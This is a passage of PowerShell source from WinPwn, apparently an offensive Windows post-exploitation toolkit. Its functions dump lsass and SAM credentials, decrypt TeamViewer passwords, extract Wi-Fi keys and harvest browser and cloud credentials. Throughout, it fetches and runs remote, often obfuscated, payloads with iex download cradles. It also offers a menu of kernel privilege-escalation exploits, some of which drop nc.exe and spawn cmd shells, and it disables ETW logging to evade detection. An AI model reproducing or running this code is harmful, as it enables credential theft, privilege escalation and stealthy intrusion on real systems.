            Write-Host -ForegroundColor Green '3. Go back '
            Write-Host ================ WinPwn ================
            $masterquestion = Read-Host -Prompt 'Please choose wisely, master'
            
            Switch ($masterquestion) 
            {
                1{if(isadmin){NanoDump -valid}}
                2{if(isadmin){NanoDump}}
            }
        }
        While ($masterquestion -ne 3)

}

function NanoDump
{
#
    .DESCRIPTION
        Execute NanoDump Shellcode to dump lsass.
        Main Credits to httpsgithub.comhelpsystemsnanodump
        Author Fabian Mosch, Twitter @ShitSecure
    #

Param
    (
        [switch]
        $valid
)

    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-NanoDump.ps1')

    if ($valid)
    {
        Invoke-NanoDump -valid
    }
    else
    {
        Invoke-NanoDump
    }
}

function werDump
{
  #
        .DESCRIPTION
        Dump lsass via wer, credit goes to httpstwitter.comJohnLaTwCstatus1411345380407578624
        Author @S3cur3Th1sSh1t
    #
    Write-Host Dumping to Cwindowstempdump.txt
    $WER = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting');$WERNativeMethods = $WER.GetNestedType('NativeMethods', 'NonPublic');$Flags = [Reflection.BindingFlags] 'NonPublic, Static';$MiniDumpWriteDump = $WERNativeMethods.GetMethod('MiniDumpWriteDump', $Flags);$ProcessDumpPath = 'Cwindowstempdump.txt';$FileStream = New-Object IO.FileStream($ProcessDumpPath, [IO.FileMode]Create);$p=Get-Process lsass;$Result = $MiniDumpWriteDump.Invoke($null, @($p.Handle,$p.Id,$FileStream.SafeFileHandle,[UInt32] 2,[IntPtr]Zero,[IntPtr]Zero,[IntPtr]Zero));$FileStream.Close()
    if (test-Path Cwindowstempdump.txt)
    {
        Write-Host Lsass dump success  $Result
    }

}

function HandleKatz
{
  #
        .DESCRIPTION
        Dump lsass, credit goes to httpsgithub.comcodewhitesecHandleKatz, @thefLinkk
        Author @S3cur3Th1sSh1t
    #
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if (isadmin)
    {
      $processes = Get-Process
      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq lsass){$process.id}}
      
      iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-Handlekatz.ps1')
      
      Write-Host Trying to dump the ID $dumpid
      Sleep 2

      Invoke-HandleKatz -handProcID $dumpid
      
      Write-Host The dump via HandleKatz is obfuscated to avoid lsass dump detections on disk. To decode it you canshould use the following httpsgithub.comcodewhitesecHandleKatzblobmainDecoder.py
    }
    else{Write-Host No Admin rights, start again using a privileged session!}
}

function Decryptteamviewer
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    # Wrote this Script myself, credit goes to @whynotsecurity - httpswhynotsecurity.comblogteamviewer
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'TeamViewerDecryptmasterTeamViewerDecrypt.ps1')
    if(!$consoleoutput){
        TeamviewerDecrypt  $currentPathExploitationTeamViewerPasswords.txt
        Get-Content $currentPathExploitationTeamViewerPasswords.txt
        Start-Sleep 5
    }
    else{
        TeamviewerDecrypt
    }
}
function SharpCloud
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'PowerSharpPackmasterPowerSharpBinariesInvoke-SharpCloud.ps1')
    if(!$consoleoutput){
        Invoke-SharpCloud -Command all  $currentPathExploitationCloudCreds.txt
        Get-Content $currentPathExploitationCloudCreds.txt
        Start-Sleep 5
    }
    else{Invoke-SharpCloud -Command all}
}

function Safedump
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    blocketw
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Invoke-SharpcradlemasterInvoke-Sharpcradle.ps1')
    
	if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsblobmasterGhostpackSafetyKatz.exeraw=true
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterGhostpackSafetyKatz.exe
	}
}
    
function Obfuskittiedump
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsmimi.ps1')
    Write-Host -ForegroundColor Yellow Dumping Credentials output goes to .ExploitationCredentials.txt
    if(!$consoleoutput){
        Invoke-TheKatz  $currentPathExploitationCredentials.txt
        Get-Content $currentPathExploitationCredentials.txt
        Start-Sleep -Seconds 5
    }else{Invoke-TheKatz}
}
function Wificreds
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsGet-WLAN-Keys.ps1')
    Write-Host Saving to .ExploitationWIFI_Keys.txt
    if(!$consoleoutput){
        Get-WLAN-Keys  $currentPathExploitationWIFI_Keys.txt
        Get-Content $currentPathExploitationWIFI_Keys.txt
        Start-Sleep -Seconds 5
    }else{Get-WLAN-Keys}
}
    
function Kittenz
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsobfuskittie.ps1')
    Write-Host -ForegroundColor Yellow 'Running the small kittie, output to .Exploitationkittenz.txt'
    if(!$consoleoutput){
        inbox  out-string -Width 5000  $currentPathExploitationkittenz.txt
        Get-Content $currentPathExploitationkittenz.txt
        Start-Sleep -Seconds 5
    }else{inbox  out-string -Width 5000}
}
    
function Samfile
{
  param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if(!$consoleoutput){pathcheck}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-PowerDump.ps1')
    Write-Host Dumping SAM, output to .ExploitationSAMDump.txt
    if(!$consoleoutput){
        Invoke-PowerDump  $currentPathExploitationSAMDump.txt
        Get-Content $currentPathExploitationSAMDump.txt
        Start-Sleep -Seconds 5
    }else{Invoke-PowerDump}
}

function Dumplsass
{
  #
        .DESCRIPTION
        Dump lsass, credit goes to httpsmodexp.wordpress.com20190830minidumpwritedump-via-com-services-dll
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
     param(
        [switch]
        $noninteractive,
        [Switch]
        $consoleoutput
        )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    if (isadmin)
    {
      try{
      $processes = Get-Process
      $dumpid = foreach ($process in $processes){if ($process.ProcessName -eq lsass){$process.id}}
      Write-Host Found lsass process with ID $dumpid - starting dump with rundll32
      if(!$consoleoutput){
            Write-Host Dumpfile goes to .Exploitation$envcomputername.log 
          rundll32 CWindowsSystem32comsvcs.dll, MiniDump $dumpid $currentPathExploitation$envcomputername.log full
        }
        else{
            Write-Host Dumpfile goes to Cwindowstemp$envcomputername.log 
            rundll32 CWindowsSystem32comsvcs.dll, MiniDump $dumpid Cwindowstemp$envcomputername.log full
        }
    }
    catch{
      Write-Host Something went wrong, using safetykatz instead
                 iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsSafetyDump.ps1')
                 if(!$consoleoutput){
                    Write-Host -ForegroundColor Yellow 'Dumping lsass to .Exploitationdebug.bin '
                    Safetydump
                move Cwindowstempdebug.bin $currentPathExploitationdebug.bin
                }
                else
                {
                    Write-Host -ForegroundColor Yellow 'Dumping lsass to Cwindowstempdebug.bin '
                    Safetydump
                }
      }
    }
    else{Write-Host No Admin rights, start again using a privileged session!}
}

function Kernelexploits
{
  #
        .DESCRIPTION
        Get a SYSTEM Shell using Kernel exploits. Most binaries are the original poc exploits loaded via Invoke-Refl3ctiv3Pe!njection + obfuscated afterwards for @msi bypass
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Exploitation
    pathcheck
    $currentPath = (Get-Item -Path . -Verbose).FullName
    @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- Get System @S3cur3Th1sSh1t

'@
        
    do
    {
        Write-Host ================ WinPwn ================
      Write-Host -ForegroundColor Green '1. MS15-077 - (XPVistaWin7Win82000200320082012) x86 only!'
      Write-Host -ForegroundColor Green '2. MS16-032 - (200878102012)!'
        Write-Host -ForegroundColor Green '3. MS16-135 - (WS2k16 only)! '
        Write-Host -ForegroundColor Green '4. CVE-2018-8120 - May 2018, Windows 7 SP12008 SP2,2008 R2 SP1! '
        Write-Host -ForegroundColor Green '5. CVE-2019-0841 - April 2019!'
        Write-Host -ForegroundColor Green '6. CVE-2019-1069 - Polarbear Hardlink, Credentials needed - June 2019! '
        Write-Host -ForegroundColor Green '7. CVE-2019-11291130 - Race Condition, multiples cores needed - July 2019! '
      Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
      Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - SMBGhost only SMBV3 with compression - no bind shell! '
      Write-Host -ForegroundColor Green '11. CVE-2020-0787 - March 2020 - all windows versions - BITSArbitraryFileMove ! '
        Write-Host -ForegroundColor Green '12. PrintNightmare - CVE-2021-34527CVE-2021-1675 - June 2021 - All Windows versions running the Spooler Service!'
        Write-Host -ForegroundColor Green '13. CallbackHell - CVE-2021-40449 - October 2021 - Win7, Win8, Win10 (some builts), Server 2008R2, Server 2012R2, Server 20162019(some builts) - httpsgithub.comly4kCallbackHell - Pop CMD default shellcode!'
        Write-Host -ForegroundColor Green '14. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
        Write-Host -ForegroundColor Green '15. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
        Write-Host -ForegroundColor Green '16. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
          1{ms15-077}
          2{ms16-32}
          3{ms16-135}
          4{CVE-2018-8120}
          5{CVE-2019-0841}
          6{cve-2019-1069}
          7{CVE-2019-1129}
          8{CVE-2019-1215}
          9{CVE-2020-0683-lpe}
          10{cve-2020-0796}
          11{cve-2020-0787-lpe}
          12{PrintNightmare}
          13{CVE-2021-40449-exp}
          14{juicypot}
            15{printspoofer}
        }
    }
    While ($masterquestion -ne 16)

}

function testtemp
{
  if(!(Test-Path -Path Ctemp))
  {
    mkdir Ctemp
  }
}

function PrintNightmare
{
    $DriverName = -join ((65..90) + (97..122)  Get-Random -Count 8  % {[char]$_})
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-PrintNightmare.ps1')
    Invoke-Nightmare -DriverName $DriverName
}

function CVE-2021-40449-exp
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterobfuscatedpsCVE-2021-40449.ps1')
    CVE-2021-40449
}

function cve-2020-0796
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpscve-2020-0796-lpe.ps1')
    cve-2020-0796-lpe
}

function cve-2020-0787-lpe
{
  iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpscve-2020-0787.ps1')
  cve-2020-0787
}

function printspoofer
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsprintspoof_interactive.ps1')
    printspoof
}

function CVE-2020-0683-lpe
{
    if ([Environment]Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpscve-2020-0683.ps1')
      CVE-2020-0683
    }
    else
    {
        Write-Host Only x64, Sorry
    }
}

function CVE-2019-1215
{
    testtemp
    
    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsnc.exe' -Outfile Ctempnc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswinexploitsnc.exe') -Outfile Ctempnc.exe
	}
    if ([Environment]Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpscve-2019-1215.ps1')
    }
    else
    {
        Write-Host Only x64, Sorry
    }

}

function ms15-077
{
    testtemp
    
    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsnc.exe' -Outfile Ctempnc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswinexploitsnc.exe') -Outfile Ctempnc.exe
	}
    if ([Environment]Is64BitProcess)
    {
        Write-Host Only x86, Sorry
    Start-Sleep -Seconds 3
    }
    else
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsm15-077.ps1')
    MS15-077 -command Ctempnc.exe 127.0.0.1 4444
    Start-Sleep -Seconds 3
    cmd c start powershell -Command {Ctempnc.exe 127.0.0.1 4444}
    }
    

}
function Juicypot
{
    testtemp
    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsnc.exe' -Outfile Ctempnc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswinexploitsnc.exe') -Outfile Ctempnc.exe
	}
    if ([Environment]Is64BitProcess)
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsjuicypotato64.ps1')
        Invoke-JuicyPotato -Command Ctempnc.exe 127.0.0.1 4444 -e cmd.exe
    }
    else
    {
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsinvoke-juicypotato.ps1')
        Invoke-JuicyPotato -Command Ctempnc.exe 127.0.0.1 4444 -e cmd.exe
    }
    Start-Sleep -Seconds 3
    cmd c start powershell -Command {Ctempnc.exe 127.0.0.1 4444}
}

function CVE-2018-8120
{
    testtemp
    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsnc.exe' -Outfile Ctempnc.exe
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswinexploitsnc.exe') -Outfile Ctempnc.exe
	}
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpscve-2018-8120.ps1')
    cve-2018-8120 -command Ctempnc.exe 127.0.0.1 4444
    Start-Sleep -Seconds 3
    cmd c start powershell -Command {Ctempnc.exe 127.0.0.1 4444}
}

function CVE-2019-0841
{
    testtemp
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Invoke-SharpcradlemasterInvoke-Sharpcradle.ps1')
    
    if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-WebRequest -Uri 'httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsnc.exe' -Outfile Ctempnc.exe
		Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsprivesc.exe -argument1 license.rtf
	
	}
	else
	{
		Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + 'CredsmasterexeFileswinexploitsnc.exe') -Outfile Ctempnc.exe
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repo + CredsmasterexeFileswinexploitsprivesc.exe -argument1 license.rtf
	}
    Start-Sleep -Seconds 3
    cmd c start powershell -Command {Ctempnc.exe 127.0.0.1 2000}
}
function CVE-2019-1129
{
	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Invoke-SharpcradlemasterInvoke-Sharpcradle.ps1')
	if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpByebear.exe -argument1 license.rtf 2
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsrawmasterexeFileswinexploitsSharpByebear.exe -argument1 license.rtf 2
	}
	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
	Start-Sleep -Seconds 15
	Write-Host 'Next Try..'
	if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
	{
		Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpByebear.exe -argument1 license.rtf 2
	}
	else
	{
		Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsSharpByebear.exe -argument1 license.rtf 2
	}
	Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
	Start-Sleep -Seconds 15
}

function CVE-2019-1069
{
	blocketw
	iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Invoke-SharpcradlemasterInvoke-Sharpcradle.ps1')
      $polaraction = Read-Host -Prompt 'Do you have a valid username and password for CVE-2019-1069'
      if ($polaraction -eq yes -or $polaraction -eq y -or $polaraction -eq Yes -or $polaraction -eq Y)
      {
        $username = Read-Host -Prompt 'Please enter the username'
        $password = Read-Host -Prompt 'Please enter the password'

		if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
		{
			Invoke-Webrequest -Uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsschedsvc.dll -Outfile $currentPathschedsvc.dll
			Invoke-Webrequest -Uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsschtasks.exe -Outfile $currentPathschtasks.exe
			Invoke-Webrequest -Uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitstest.job -Outfile $currentPathtest.job
		}
		else
		{
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsschedsvc.dll -Outfile $currentPathschedsvc.dll
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsschtasks.exe -Outfile $currentPathschtasks.exe
			Invoke-Webrequest -Uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitstest.job -Outfile $currentPathtest.job
		}
		
        if ([Environment]Is64BitProcess)
        {
   			if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
			{
				Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpPolarbear.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpPolarbear.exe -argument1 license.rtf $username $password
			}
			else
			{
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsSharpPolarbear.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsSharpPolarbear.exe -argument1 license.rtf $username $password
			}
        }
        else
        {
			if ($S3cur3Th1sSh1t_repo -eq httpsraw.githubusercontent.comS3cur3Th1sSh1t)
			{
				Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpPolarbearx86.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri httpsgithub.comS3cur3Th1sSh1tCredsrawmasterexeFileswinexploitsSharpPolarbearx86.exe -argument1 license.rtf $username $password
			}
			else
			{
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsSharpPolarbearx86.exe -argument1 license.rtf $username $password
				Start-Sleep -Seconds 1.5
				Invoke-Sharpcradle -uri $S3cur3Th1sSh1t_repoCredsmasterexeFileswinexploitsSharpPolarbearx86.exe -argument1 license.rtf $username $password
			}
        }
		
        move envUSERPROFILEAppdataLocaltemplicense.rtf Cwindowssystem32license.rtf
        del .schedsvc.dll
        del .schtasks.exe
        del Cwindowssystem32taskstest
      }
}

function ms16-32
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsms16-32.ps1')
    Invoke-MS16-032
}

function ms16-135
{
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'Credsmasterobfuscatedpsms16-135.ps1')
}

function Localreconmodules
{
  #
        .DESCRIPTION
        All local recon scripts are executed here.
        Author @S3cur3Th1sSh1t
        License BSD 3-Clause
    #
    #Local Reconning
    [CmdletBinding()]
    Param (
        [Switch]
        $consoleoutput,
        [Switch]
        $noninteractive   
    )
         
      
            
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName
    @'

             
__        ___       ____                 
        (_)_ __   _ __      ___ __  
       '_  _)      '_  
   V  V        __  V  V    
   __  __ __     __ _ _

   -- Localreconmodules

'@
    if ($noninteractive -and (!$consoleoutput))
    {
        generalrecon -noninteractive
        powershellsensitive -noninteractive
        browserpwn -noninteractive
        dotnet -noninteractive
        passhunt -local $true -noninteractive
        sessionGopher -noninteractive
        sensitivefiles -noninteractive
        return;
    }
    elseif ($noninteractive -and $consoleoutput)
    {
        generalrecon -noninteractive -consoleoutput
        powershellsensitive -noninteractive -consoleoutput
        browserpwn -noninteractive -consoleoutput
        dotnet -noninteractive -consoleoutput 
        sessionGopher -noninteractive -consoleoutput
        sensitivefiles -noninteractive -consoleoutput
        return;    
    }
    
    do
    {
        Write-Host ================ WinPwn ================
        Write-Host -ForegroundColor Green '1. Collect general computer informations, this will take some time!'
        Write-Host -ForegroundColor Green '2. Check Powershell event logs for credentials or other sensitive information! '
        Write-Host -ForegroundColor Green '3. Collect Browser credentials as well as the history! '
        Write-Host -ForegroundColor Green '4. Search for .NET Service-Binaries on this system! '
        Write-Host -ForegroundColor Green '5. Search for Passwords on this system using passhunt.exe!'
        Write-Host -ForegroundColor Green '6. Start SessionGopher! '
        Write-Host -ForegroundColor Green '7. Search for sensitive files on this local system (config files, rdp files, password files and more)! '
        Write-Host -ForegroundColor Green '8. Execute PSRecon or Get-ComputerDetails (powersploit)! '
        Write-Host -ForegroundColor Green '9. Search for any .NET binary file in a share! '
        Write-Host -ForegroundColor Green '10. Go back '
        Write-Host ================ WinPwn ================
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master'

        Switch ($masterquestion) 
        {
             1{generalrecon}
             2{powershellsensitive}
             3{browserpwn}
             4{dotnet}
             5{passhunt -local $true}
             6{sessiongopher}
             7{sensitivefiles}
             8{morerecon}
             9{dotnetsearch}
       }
    }
  While ($masterquestion -ne 10)
}

function Generalrecon{
    Param (
    [Switch]
    $consoleoutput,
    [Switch]
    $noninteractive   
  )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path . -Verbose).FullName

    Write-Host -ForegroundColor Yellow 'Starting local Recon phase'
    #Check for WSUS Updates over HTTP
  Write-Host -ForegroundColor Yellow 'Checking for WSUS over http'
    $UseWUServer = (Get-ItemProperty HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdateAU -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
    $WUServer = (Get-ItemProperty HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate -Name WUServer -ErrorAction SilentlyContinue).WUServer

    if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith(http)) 
  {
        Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
      if(!$consoleoutput){echo Wsus over http detected! Fake Updates can be delivered here. $UseWUServer  $WUServer   $currentPathVulnerabilitiesWsusoverHTTP.txt}else{echo Wsus over http detected! Fake Updates can be delivered here. $UseWUServer  $WUServer }
    }

    #Check for SMB Signing
    Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + 'CredsmasterPowershellScriptsInvoke-SMBNegotiate.ps1')
    if(!$consoleoutput){Invoke-SMBNegotiate -ComputerName localhost  $currentPathVulnerabilitiesSMBSigningState.txt}else{Write-Host -ForegroundColor red SMB Signing State ;Invoke-SMBNegotiate -ComputerName localhost}


    #Check .NET Framework versions in use
    $Lookup = @{
    378389 = [version]'4.5'
    378675 = [version]'4.5.1'
    378758 = [version]'4.5.1'
    379893 = [version]'4.5.2'
    393295 = [version]'4.6'
    393297 = [version]'4.6'
    394254 = [version]'4.6.1'
    394271 = [version]'4.6.1'
    394802 = [version]'4.6.2'
    394806 = [version]'4.6.2'
    460798 = [version]'4.7'
    460805 = [version]'4.7'
    461308 = [version]'4.7.1'
    461310 = [version]'4.7.1'
    461808 = [version]'4.7.2'
    461814 = [version]'4.7.2'
    528040 = [version]'4.8'
    528049 = [version]'4.8'
    }

    $Versions = Get-ChildItem 'HKLMSOFTWAREMicrosoftNET Framework SetupNDP' -Recurse 
  Get-ItemProperty -name Version, Release -EA 0 
  Where-Object { $_.PSChildName -match '^(!S)p{L}'} 
  Select-Object @{name = .NET Framework; expression = {$_.PSChildName}}, 
  @{name = Product; expression = {$Lookup[$_.Release]}},Version, Release
    
    if(!$consoleoutput)
    {
        $Versions  $currentPathLocalReconNetFrameworkVersionsInstalled.txt
    }
    else
    {
        $Versions
    }

    #Collecting usefull Informations
    if(!$consoleoutput){
        Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .LocalRecon'
        systeminfo  $currentPathLocalReconsysteminfo.txt
        Write-Host -ForegroundColor Yellow 'Getting Patches'
      wmic qfe  $currentPathLocalReconPatches.txt
        wmic os get osarchitecture  $currentPathLocalReconArchitecture.txt
      Write-Host -ForegroundColor Yellow 'Getting environment variables'
        Get-ChildItem Env  ft Key,Value  $currentPathLocalReconEnvironmentvariables.txt
      Write-Host -ForegroundColor Yellow 'Getting connected drives'
        Get-PSDrive  where {$_.Provider -like Microsoft.PowerShell.CoreFileSystem} ft Name,Root  $currentPathLocalReconDrives.txt
        Write-Host -ForegroundColor Yellow 'Getting current user Privileges'
      whoami priv  $currentPathLocalReconPrivileges.txt
        Get-LocalUser  ft Name,Enabled,LastLogon  $currentPathLocalReconLocalUsers.txt
        Write-Host -ForegroundColor Yellow 'Getting local AccountsUsers + Password policy'
      net accounts   $currentPathLocalReconPasswordPolicy.txt
        Get-LocalGroup  ft Name  $currentPathLocalReconLocalGroups.txt
      Write-Host -ForegroundColor Yellow 'Getting network interfaces, route information, Arp table'
        Get-NetIPConfiguration  ft InterfaceAlias,InterfaceDescription,IPv4Address  $currentPathLocalReconNetworkinterfaces.txt
        Get-DnsClientServerAddress -AddressFamily IPv4  ft  $currentPathLocalReconDNSServers.txt
        Get-NetRoute -AddressFamily IPv4  ft DestinationPrefix,NextHop,RouteMetric,ifIndex  $currentPathLocalReconNetRoutes.txt
        Get-NetNeighbor -AddressFamily IPv4  ft ifIndex,IPAddress,LinkLayerAddress,State  $currentPathLocalReconArpTable.txt
        netstat -ano  $currentPathLocalReconActiveConnections.txt
        Get-ChildItem 'HKLMSOFTWAREMicrosoftNET Framework SetupNDP' -Recurse  Get-ItemProperty -Name Version, Release -ErrorAction 0  where { $_.PSChildName -match '^(!S)p{L}'}  select PSChildName, Version, Release  $currentPathLocalReconInstalledDotNetVersions
        Write-Host -ForegroundColor Yellow 'Getting Shares'
      net share  $currentPathLocalReconNetworkshares.txt
      Write-Host -ForegroundColor Yellow 'Getting hosts file content'
      get-content $envwindirSystem32driversetchosts  out-string   $currentPathLocalReconetc_Hosts_Content.txt
      Get-ChildItem -Path HKLMSoftwareShellopencommand  $currentPathLocalReconTest_for_Argument_Injection.txt
  }
    else
    {
        Write-Host -ForegroundColor Yellow '-------------- Collecting local system Informations for later lookup, saving them to .LocalRecon ----------'
        systeminfo 
        Write-Host -ForegroundColor Yellow '------- Getting Patches'
      wmic qfe 
        wmic os get osarchitecture 
